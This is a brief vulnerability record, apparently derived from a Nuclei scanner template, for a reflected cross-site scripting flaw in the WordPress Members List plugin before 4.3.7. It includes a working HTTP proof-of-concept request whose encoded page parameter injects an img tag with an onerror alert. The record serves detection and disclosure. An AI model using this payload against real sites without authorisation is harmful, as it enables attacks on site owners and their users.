# Vulnerability: WordPress Members List <4.3.7 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`members-list-xss.yaml`)

## Description
WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x
```

